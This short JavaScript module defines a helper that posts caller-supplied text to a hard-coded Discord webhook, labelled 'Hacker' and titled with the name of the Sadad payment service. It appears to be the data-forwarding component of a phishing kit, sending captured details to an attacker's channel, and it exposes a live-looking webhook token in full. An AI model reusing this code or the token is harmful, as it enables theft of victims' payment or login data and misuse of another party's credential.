import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321803787404447745/_VjLPZNLpR6COmtL-T95JzJRYGwJXkSgzYpGrhxcV652ouSQqbSU8UUBoD1RccSnm6np",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
